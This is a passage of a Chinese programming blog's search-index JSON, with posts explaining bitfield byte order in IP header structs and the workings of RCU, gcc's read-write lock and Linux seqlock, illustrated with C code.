href=\"http://likakuli.com/post/2018/06/06/golang-network/\">Golang netpoll</a></p>\n<p><a href=\"https://morsmachine.dk/netpoller\">The Go netpoller</a></p>\n<p><a href=\"https://www.infoq.cn/article/netty-threading-model\">Netty 系列之 Netty 线程模型</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1234360\">Go语言源码笔记</a></p>\n","categories":["代码"],"tags":["狗狼"]},{"title":"Byte order of bitfield","url":"/2016/11/14/bitorder/","content":"<h2 id=\"位域的字节序\"><a href=\"#位域的字节序\" class=\"headerlink\" title=\"位域的字节序\"></a>位域的字节序</h2><h3 id=\"问题的起源\"><a href=\"#问题的起源\" class=\"headerlink\" title=\"问题的起源\"></a>问题的起源</h3><p>今天阅读到ip头结构体，看到前面两个字段用到了宏，可以看到这两个字段在大小端（大/小字节序）情况下的顺序是不同的。<br>于是有一个疑问，为什么其他字段可以不管大小端，唯独这两个字段要关注大小端。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//IP头部，总长度20字节   </span><br><span class=\"line\">typedef struct _ip_hdr  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    #if LITTLE_ENDIAN   </span><br><span class=\"line\">    unsigned char ihl:4;     //首部长度   </span><br><span class=\"line\">    unsigned char version:4, //版本    </span><br><span class=\"line\">    #else   </span><br><span class=\"line\">    unsigned char version:4, //版本   </span><br><span class=\"line\">    unsigned char ihl:4;     //首部长度   </span><br><span class=\"line\">    #endif   </span><br><span class=\"line\">    unsigned char tos;       //服务类型   </span><br><span class=\"line\">    unsigned short tot_len;  //总长度   </span><br><span class=\"line\">    unsigned short id;       //标志   </span><br><span class=\"line\">    unsigned short frag_off; //分片偏移   </span><br><span class=\"line\">    unsigned char ttl;       //生存时间   </span><br><span class=\"line\">    unsigned char protocol;  //协议   </span><br><span class=\"line\">    unsigned short chk_sum;  //检验和   </span><br><span class=\"line\">    struct in_addr srcaddr;  //源IP地址   </span><br><span class=\"line\">    struct in_addr dstaddr;  //目的IP地址   </span><br><span class=\"line\">&#125;ip_hdr;</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<h3 id=\"网络传输的过程\"><a href=\"#网络传输的过程\" class=\"headerlink\" title=\"网络传输的过程\"></a>网络传输的过程</h3><p>网络传输中，由于网络两端的设备并不知道对方是什么字节序，所以接收端就无法知晓应该按照大端还是小端来还原数据。<br>于是网络协议就规定，传输过程一律采用大端的方式传输，网络两端的设备可以在大端和本地字节序之间转换。<br>比如小端与小端之间的通信过程:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[本地：小端-&gt;大端]&lt;-- 网络  --&gt;[大端-&gt;小端：远端]</span><br></pre></td></tr></table></figure>\n\n<p>由于有了上面这个过程，我们在写代码的时候可以无需关注字节序问题，只要按照这个过程转换一遍准没错。<br>假设我本地变量是0x12345678,本地是小端结构，所以12是高内存位，78是低内存位。<br>发送前经过转换成大端结构，于是78换到高内存位，12换到低内存位，值为0x78563412.<br>咦？怎么不是0x87654321。这里要注意了，不是0x87654321.<br>不管是ntohl还是htonl都是按字节为单位逆转顺序的，78和12分别是一整个字节，所以是不会被换成87和21的。</p>\n<p>然后0x78563412被传到远端，远端是小端，又把78换到低内存位：0x12345678。<br>假如远端是大端，大端转到大端是个空操作，于是78还是高内存位，12还是低内存位；在大端的系统中，低内存位代表高位值，于是值也是0x12345678.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[本地：0x12345678-&gt;0x78563412]&lt;-- 0x78563412  --&gt;[0x78563412-&gt;0x12345678：远端]</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"总结规律\"><a href=\"#总结规律\" class=\"headerlink\" title=\"总结规律\"></a>总结规律</h3><p>通过上面传输过程的回顾，我们再结合我们自己的编码经验，可以总结发现：<br>2字节的数据通过ntohs和htons来转换字节序。<br>4字节的数据通过ntohl和htonl来转换字节序。<br>字节序的最小单位是1个字节，也就是说1个字节的数据无需转换。<br>一个字节的数据不论在哪种字节序的系统下都会解析成一样的值。</p>\n<p>我们在看ip头的结构体：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//IP头部，总长度20字节   </span><br><span class=\"line\">typedef struct _ip_hdr  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    #if LITTLE_ENDIAN   </span><br><span class=\"line\">    unsigned char ihl:4;     //首部长度   </span><br><span class=\"line\">    unsigned char version:4, //版本    </span><br><span class=\"line\">    #else   </span><br><span class=\"line\">    unsigned char version:4, //版本   </span><br><span class=\"line\">    unsigned char ihl:4;     //首部长度   </span><br><span class=\"line\">    #endif   </span><br><span class=\"line\">    unsigned char tos;       //服务类型   </span><br><span class=\"line\">    unsigned short tot_len;  //总长度   </span><br><span class=\"line\">    unsigned short id;       //标志   </span><br><span class=\"line\">    unsigned short frag_off; //分片偏移   </span><br><span class=\"line\">    unsigned char ttl;       //生存时间   </span><br><span class=\"line\">    unsigned char protocol;  //协议   </span><br><span class=\"line\">    unsigned short chk_sum;  //检验和   </span><br><span class=\"line\">    struct in_addr srcaddr;  //源IP地址   </span><br><span class=\"line\">    struct in_addr dstaddr;  //目的IP地址   </span><br><span class=\"line\">&#125;ip_hdr;</span><br></pre></td></tr></table></figure>\n<p>我们可以看出这个结构中除了char型的数据不需要转换，其他数据都要经过htonx/ntohx转换。<br>然而不管需不需要转换，都无需改变字段定义的顺序啊？</p>\n<h3 id=\"规律之外\"><a href=\"#规律之外\" class=\"headerlink\" title=\"规律之外\"></a>规律之外</h3><p>我们虽然总结了规律，但是规律却没法描述位域字段。什么叫位域，也就是变量后面跟上冒号接数字表示这个变量占几个比特位的这种字段，比如：<br>unsigned char ihl:4   这表示ihl只占用了4个比特位。<br>这种字段我们是怎么来处理大小端的呢？</p>\n<p>实际上这种比特位的字段的规律可以类比：<br>多个位域字段   -&gt; 类比到 -&gt; 多字节<br>最小单位字节   -&gt; 类比到 -&gt; 最小单位为一个位域字段</p>\n<p>也就是把一个位域字段想成一个字节，多个位域字段想成一个多字节变量。<br>比如:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">struct Example&#123;</span><br><span class=\"line\">\tunsigned char ihl:4;     //首部长度   </span><br><span class=\"line\">\tunsigned char version:4, //版本  </span><br><span class=\"line\">&#125; example;</span><br><span class=\"line\">example.ihl=1;</span><br><span class=\"line\">example.version=2;</span><br><span class=\"line\">// 当我们赋值完后可以想象成example = 0x version,ihl  即 example = 0x21</span><br><span class=\"line\">// 对于位域的bit数不是4的也一样规律，</span><br><span class=\"line\">// 那么example在小端系统上的内存排列是</span><br><span class=\"line\">//  bit: | 7 | 6 | 5 | 4 | 3 | 2 | 1 | 0 |</span><br><span class=\"line\">//         0   0   1   0 , 0   0   0   1</span><br><span class=\"line\">// 在大端系统上的排列是</span><br><span class=\"line\">//  bit: | 7 | 6 | 5 | 4 | 3 | 2 | 1 | 0 |</span><br><span class=\"line\">//         0   0   0   1 , 0   0   1   0</span><br><span class=\"line\">//</span><br></pre></td></tr></table></figure>\n\n<p>这个类比是关键的原理，是导致我们为什么用宏来区分字段顺序的关键！</p>\n<p>由于有以上的类比，为了接收端能够正确还原数据，我们也需要这个过程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[本地：小端-&gt;大端]&lt;-- 网络  --&gt;[大端-&gt;小端：远端]</span><br><span class=\"line\">比如本地的一个值是0x21,比如上面的example,我们希望的传输过程：</span><br><span class=\"line\">[本地：0010,0001-&gt;0001,0010]&lt;-- 0001,0010  --&gt;[0001,0010-&gt;0010,0001：远端]</span><br></pre></td></tr></table></figure>\n\n<p>然而由于位域并不固定几个比特位，所以遗憾的是系统没法提供基于位域的大小端转换函数。<br>所以我们实际上是无法完成大端&lt;-&gt;小端之间的转换的。这可怎么办？</p>\n<h3 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h3><p>所以我们只有一个办法，手动保证在网络两端都是大端（或者小端）的内存结构，这样两边都不转换也能保证值不变。<br>于是我们可以想到利用宏来判断，下面这段定义，我们可以看到，作者的目的是把ihl作为内存的低4位，version作为高4位。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#if LITTLE_ENDIAN   </span><br><span class=\"line\">unsigned char ihl:4;     //首部长度   </span><br><span class=\"line\">unsigned char version:4, //版本    </span><br><span class=\"line\">#else   </span><br><span class=\"line\">unsigned char version:4, //版本   </span><br><span class=\"line\">unsigned char ihl:4;     //首部长度   </span><br><span class=\"line\">#endif   </span><br></pre></td></tr></table></figure>\n<p>如果是小端系统，ihl定义在前，由上面的example可以得知，小端先定义的处于低内存位，ihl是处于低内存位的。<br>如果是大端系统，version定义在前，由上面example得知，大端先定义的位于高内存位，version定义在高内存位，ihl就在低内存位，于是ihl无论如何都在低内存位了。</p>\n<h3 id=\"另一种记忆方法\"><a href=\"#另一种记忆方法\" class=\"headerlink\" title=\"另一种记忆方法\"></a>另一种记忆方法</h3><p>对于位域字段如何确定他们的内存排列，除了按照上面的分析，把一个位域字段想成一个字节，多个位域字段想成一个多字节变量外，还有一种记忆方法。</p>\n<p>对于多个位域字段，你可以认为系统总是从上往下依次把他们从低内存向高内存排列过去。当然这指的是小端。<br>大端则相反，总是把他们从上往下从高内存向低内存排列，但是一个字段是作为一个整体，不做拆分或者转换。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;memory.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">struct WORD&#123;</span><br><span class=\"line\">        unsigned short bit1:4;</span><br><span class=\"line\">        unsigned short bit2:9;</span><br><span class=\"line\">        unsigned short bit3:3;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        WORD word;</span><br><span class=\"line\">        memset(&amp;word,0,sizeof(word));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 111,100000001,0001  =&gt; 7,257,1</span><br><span class=\"line\">        unsigned short low16bit=0xF011;</span><br><span class=\"line\">        memcpy(&amp;word,&amp;low16bit,sizeof(low16bit));</span><br><span class=\"line\"></span><br><span class=\"line\">        printf(&quot;size:%d,bit1:%d,bit2:%d,bit3:%d\\n&quot;,sizeof(word),word.bit1,word.bit2,word.bit3);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// size:2,bit1:1,bit2:257,bit3:7</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这是小端的结果，大端是不同的。<br>我们还可以看到当4+9+3==16,正好是16的倍数的时候，字段是紧凑排列的。不是16倍数时候就不一定紧凑了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;memory.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">struct WORD&#123;</span><br><span class=\"line\">        unsigned short bit1:4;</span><br><span class=\"line\">        unsigned short bit2:9;</span><br><span class=\"line\">        unsigned short bit3:11;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        WORD word;</span><br><span class=\"line\">        memset(&amp;word,0,sizeof(word));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 111,100000001,0001</span><br><span class=\"line\">        unsigned short low16bit=0xF011;</span><br><span class=\"line\">        memcpy(&amp;word,&amp;low16bit,sizeof(low16bit));</span><br><span class=\"line\"></span><br><span class=\"line\">         //0000,0000,0000,0010</span><br><span class=\"line\">         unsigned short high16bit=0x2;</span><br><span class=\"line\">         memcpy((char*)(&amp;word)+2,&amp;high16bit,sizeof(high16bit));</span><br><span class=\"line\"></span><br><span class=\"line\">        printf(&quot;size:%d,bit1:%d,bit2:%d,bit3:%d\\n&quot;,sizeof(word),word.bit1,word.bit2,word.bit3);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// size:4,bit1:1,bit2:257,bit3:2</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>我们看到4+9+11==24，但是sizeof是4，而且可以看到bit3并没有紧跟着bit2而是被安排到了一个新的字节当中去。</p>\n","categories":["代码"],"tags":["网络"]},{"title":"不同形式的锁","url":"/2019/09/03/locks/","content":"<h1 id=\"不同形式的锁\"><a href=\"#不同形式的锁\" class=\"headerlink\" title=\"不同形式的锁\"></a>不同形式的锁</h1><p>最近发现锁的类型真是多种多样，好多还是第一次见，我就在这里记录一下。</p>\n<h2 id=\"RCU\"><a href=\"#RCU\" class=\"headerlink\" title=\"RCU\"></a>RCU</h2><p>RCU即read-copy-update.一种不阻塞读线程，只阻塞写线程的同步方式。</p>\n<p>写线程如果有多个要自己做好互斥，一个时间只能有一个写线程。写线程严格执行R-C-U三步操作，但在第三步操作完的时候，因为把原来的值给更新掉了，原来旧的值就需要释放，那么持有了原来旧的值的读线程必须全部操作完成才行。这里所说的操作的旧值新值都是指针，只有指针才可以直接的确保原子性。</p>\n<p>所以这里有个关键步骤是synchronize_rcu()，位于U之后和释放旧指针之前。synchronize_rcu的底层实现我不懂，它的原理大概是说等待所有cpu都调度一遍，就可以确保旧的读线程都操作完成了。为什么都调度一遍就可以确保都操作完了呢？因为所有的读操作都要求添加以下语句：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">rcu_read_lock(); <span class=\"comment\">// 禁止抢占</span></span><br><span class=\"line\">p = rcu_dereference(gp); <span class=\"comment\">// rcu_dereference主要是加内存屏障</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (p != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">    do_something_with(p-&gt;a, p-&gt;b, p-&gt;c);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">rcu_read_unlock(); <span class=\"comment\">// 允许抢占</span></span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n\n<p>rcu_read_lock和rcu_read_unlock会组成RCU临界区，这个临界区是不会被中断的，所以只要执行了就一定是执行完成的。那么每个cpu都发生了调度，也就意味着每个正在操作的读，都结束了。</p>\n<p>下面是关于写线程的完整的例子：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 来自 http://www.hyuuhit.com/2018/11/08/rcu/</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">foo</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> a;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> b;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">foo</span> *<span class=\"title\">gp</span> =</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">p = rcu_dereference(gp); <span class=\"comment\">// R操作，rcu_dereference主要是加内存屏障</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (p == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* 做适当操作 */</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">q = kmalloc(<span class=\"keyword\">sizeof</span>(*p), GFP_KERNEL); </span><br><span class=\"line\">*q = *p; <span class=\"comment\">// C操作</span></span><br><span class=\"line\">q-&gt;b = <span class=\"number\">2</span>;</span><br><span class=\"line\">q-&gt;c = <span class=\"number\">3</span>;</span><br><span class=\"line\">rcu_assign_pointer(gp, q); <span class=\"comment\">// U操作,rcu_assign_pointer主要是加内存屏障</span></span><br><span class=\"line\">synchronize_rcu(); <span class=\"comment\">// U之后要等待持有了旧的gp的线程结束</span></span><br><span class=\"line\">kfree(p);</span><br></pre></td></tr></table></figure>\n\n<p>另外如果对关于释放老指针有兴趣的，可以参考下这段话：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自： http://www.embeddedlinux.org.cn/html/yingjianqudong/201404/07-2830.html</span><br><span class=\"line\"></span><br><span class=\"line\">在释放老指针方面，Linux内核提供两种方法供使用者使用，一个是调用call_rcu,另一个是调用synchronize_rcu。前者是一种异步 方式，call_rcu会将释放老指针的回调函数放入一个结点中，然后将该结点加入到当前正在运行call_rcu的处理器的本地链表中，在时钟中断的 softirq部分（RCU_SOFTIRQ）， rcu软中断处理函数rcu_process_callbacks会检查当前处理器是否经历了一个休眠期(quiescent，此处涉及内核进程调度等方面的内容)，rcu的内核代码实现在确定系统中所有的处理器都经历过了一个休眠期之后(意味着所有处理器上都发生了一次进程切换，因此老指针此时可以被安全释放掉了)，将调用call_rcu提供的回调函数。</span><br><span class=\"line\">synchronize_rcu的实现则利用了等待队列，在它的实现过程中也会向call_rcu那样向当前处理器的本地链表中加入一个结点，与 call_rcu不同之处在于该结点中的回调函数是wakeme_after_rcu，然后synchronize_rcu将在一个等待队列中睡眠，直到系统中所有处理器都发生了一次进程切换，因而wakeme_after_rcu被rcu_process_callbacks所调用以唤醒睡眠的 synchronize_rcu，被唤醒之后，synchronize_rcu知道它现在可以释放老指针了。</span><br><span class=\"line\"></span><br><span class=\"line\">所以我们看到，call_rcu返回后其注册的回调函数可能还没被调用，因而也就意味着老指针还未被释放，而synchronize_rcu返回后老指针肯定被释放了。所以，是调用call_rcu还是synchronize_rcu，要视特定需求与当前上下文而定，比如中断处理的上下文肯定不能使用 synchronize_rcu函数了。 </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"RW-lock\"><a href=\"#RW-lock\" class=\"headerlink\" title=\"RW  lock\"></a>RW  lock</h2><p>关于读写锁，大家应该相对还是比较熟悉的，功能是如果写线程持有锁，那么其他写和读线程都不能再加锁成功；如果是读线程持有锁，那么其他读线程还是可以加锁成功，写线程不能加锁成功。</p>\n<p>我们已gcc的源码来分析看他是怎么实现的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> __<span class=\"title\">shared_mutex_cv</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  mutex\t\t_M_mut; <span class=\"comment\">// 内部用的互斥量，保护_M_state</span></span><br><span class=\"line\">  condition_variable\t_M_gate1; <span class=\"comment\">// 用来等待当前的写线程完成</span></span><br><span class=\"line\">  condition_variable\t_M_gate2; <span class=\"comment\">// 用来等待当前的读线程完成</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 0x80 00 00 00代表加了写锁，&lt; 0x80 00 00 00代表当前加的读锁的个数，0代表没有被加锁</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span>\t\t_M_state;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">lock</span><span class=\"params\">()</span></span>;  <span class=\"comment\">// 加写锁</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">unlock</span><span class=\"params\">()</span></span>; <span class=\"comment\">// 解写锁</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">lock_shared</span><span class=\"params\">()</span></span>; <span class=\"comment\">// 加读锁</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">unlock_shared</span><span class=\"params\">()</span></span>; <span class=\"comment\">// 解读锁</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到内部使用了一个互斥量，所以读写锁内部不是有两个互斥量，而是只有一个的。</p>\n<p>另外他使用了一个状态值来表示当前加的是读锁还是解锁，这点你看原理前估计是没有想到的。0代表无锁，最高位置为1代表加了写锁，其他值代表当前加了读锁的个数。</p>\n<p>总是里面定义了两个gate，顾名思义是两个关卡，写锁要经过两道，读锁则只需经过一道。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">lock</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  unique_lock&lt;mutex&gt; __lk(_M_mut);</span><br><span class=\"line\">  _M_gate1.wait(__lk, [=]&#123; <span class=\"keyword\">return</span> !_M_write_entered(); &#125;); <span class=\"comment\">// 等待写操作完成，但是可能还有读线程</span></span><br><span class=\"line\">  _M_state |= _S_write_entered; <span class=\"comment\">// 加上写锁标识，把后续的读和写线程挡在gate1外面</span></span><br><span class=\"line\">  _M_gate2.wait(__lk, [=]&#123; <span class=\"keyword\">return</span> _M_readers() == <span class=\"number\">0</span>; &#125;); <span class=\"comment\">// 这一步等待读操作完成</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如上是加写锁的操作，就是等待写完成，再等待读完成。为了防止读操作源源不断，导致写操作饿死，在等待读完成前会置上标志，让后面的读（和写）保持等待。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">unlock</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  lock_guard&lt;mutex&gt; __lk(_M_mut);</span><br><span class=\"line\">  __glibcxx_assert( _M_write_entered() );</span><br><span class=\"line\">  _M_state = <span class=\"number\">0</span>;</span><br><span class=\"line\">  _M_gate1.notify_all(); <span class=\"comment\">// 唤醒gate1外面的读写线程，这里读线程还是有抢占的机会的</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如上是解写锁的操作，和简单，把状态置为未加锁，然后唤醒gate1中等待的线程。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">lock_shared</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  unique_lock&lt;mutex&gt; __lk(_M_mut);</span><br><span class=\"line\">  <span class=\"comment\">// 等待写操作完成，且等待读操作个数没有满(_S_max_readers=0x80000000-1)</span></span><br><span class=\"line\">  _M_gate1.wait(__lk, [=]&#123; <span class=\"keyword\">return</span> _M_state &lt; _S_max_readers; &#125;);</span><br><span class=\"line\">  ++_M_state;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如上是加读锁，跟加写锁类似，需要等待写操作完成，_M_state &lt; _S_max_readers 一方面可以判断没有加写锁，另一方面还可以判断当前读线程没有满。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">unlock_shared</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  lock_guard&lt;mutex&gt; __lk(_M_mut);</span><br><span class=\"line\">  __glibcxx_assert( _M_readers() &gt; <span class=\"number\">0</span> );</span><br><span class=\"line\">  <span class=\"keyword\">auto</span> __prev = _M_state--; <span class=\"comment\">// 读线程个数减1</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (_M_write_entered()) <span class=\"comment\">// 如果有写线程在等待了</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (_M_readers() == <span class=\"number\">0</span>) <span class=\"comment\">// 如果自己是最后一个活跃的读线程</span></span><br><span class=\"line\">     _M_gate2.notify_one(); <span class=\"comment\">// 唤醒一个写线程</span></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"comment\">// 没有写线程等待</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (__prev == _S_max_readers) <span class=\"comment\">// 如果原先读线程个数是满的</span></span><br><span class=\"line\">     _M_gate1.notify_one(); <span class=\"comment\">// 唤醒一个读线程</span></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n<p>如上是解锁读锁的过程，除了把_M_state减1外还要负责在以下情况下唤醒别的线程，当自己是最后一个读线程且已经有写线程在等待了，就唤醒写线程；当原先读线程数是满的时候，且当前没有写线程等待，就唤醒一个读线程。</p>\n<h2 id=\"seqlock\"><a href=\"#seqlock\" class=\"headerlink\" title=\"seqlock\"></a>seqlock</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">seqcount</span> <span class=\"title\">seqcount</span>;</span></span><br><span class=\"line\">\t<span class=\"keyword\">spinlock_t</span> lock;</span><br><span class=\"line\">&#125; <span class=\"keyword\">seqlock_t</span>;</span><br></pre></td></tr></table></figure>\n\n<p>seqlock是一种针对读写有不同优先权的锁，写的优先权要大于读的优先权。</p>\n<p>那多个线程写的时候呢，可以看到结构体中有个spinlock，写线程必须先锁住spinlock，这样确保只有一个线程在写。</p>\n<p>那如果写的时候有线程在读呢，不管，照样写。</p>\n<p>那读的这个线程怎么办呢，读一半被改了怎么办。这里就用到了结构体中的seqcount。</p>\n<p>seqcount只有写线程会进行修改，每次拿到spinlock之后立即seqcount++，在解锁spinlock前又再次seqcount++。同时读线程在开始读之前会取一次seqcount，在读完会再取一次seqcount，如果两次值一样就说明中间没有写线程进入[下面还会解释]。否则就从头开始读。</p>\n<p>所以读线程的代码就是像下面这样的，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 来自linux源码</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">ktime_t</span> <span class=\"title\">intel_engine_get_busy_time</span><span class=\"params\">(struct intel_engine_cs *engine)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">\t\tseq = read_seqbegin(&amp;engine-&gt;stats.lock); <span class=\"comment\">// 这里读seq</span></span><br><span class=\"line\">\t\ttotal = __intel_engine_get_busy_time(engine); <span class=\"comment\">// 这里读临界区的数据</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">while</span> (read_seqretry(&amp;engine-&gt;stats.lock, seq)); <span class=\"comment\">// 这里检查seq是否改变</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> total;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>关于写线程的代码是像下面这样的，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 来自linux源码</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">inline</span> <span class=\"keyword\">void</span> <span class=\"title\">write_seqlock</span><span class=\"params\">(<span class=\"keyword\">seqlock_t</span> *sl)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tspin_lock(&amp;sl-&gt;lock);</span><br><span class=\"line\">\twrite_seqcount_begin(&amp;sl-&gt;seqcount); <span class=\"comment\">// 这里会执行seqcount++</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">inline</span> <span class=\"keyword\">void</span> <span class=\"title\">write_sequnlock</span><span class=\"params\">(<span class=\"keyword\">seqlock_t</span> *sl)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\twrite_seqcount_end(&amp;sl-&gt;seqcount);<span class=\"comment\">// 这里会执行seqcount++</span></span><br><span class=\"line\">\tspin_unlock(&amp;sl-&gt;lock);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注意，这里你可能会提几个问题：</p>\n<p><code>读线程会不会因为cpu缓存而取不到最新的seqcount值？</code>不会的，跟踪读取seqcount的代码，可以发现读取是使用的volatile read，可以做到总是取最新值。</p>\n<p><code>两个写线程之间会不会因为cpu缓存看不到对方线程增加的seqcount？</code>比如原来seqcount=0。A线程进出临界区对seqcount加了2，B线程进出临界区也加了2，如果加的只是cpu缓存中的seqcount，那最终seqcount就只是2不是4。也不会的，因为锁都自带内存屏障，他可以做到，当B线程发现A已经解锁的时候，B也一定能发现A解锁前的那些指令已经执行完了，也即可以发现seqcount已经被++过了。</p>\n<p><code>为什么写线程进出临界区都要加1？</code>你想一下如果只加一次，不管是进入加还是离开加，都可能让读线程处在写线程的过程当中，感知不到写线程的存在：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">--&gt; begin write      </span><br><span class=\"line\">    write              --&gt; begin read</span><br><span class=\"line\">    write                  read   </span><br><span class=\"line\">    write              --&gt; end read</span><br><span class=\"line\">    write</span><br><span class=\"line\">--&gt; end 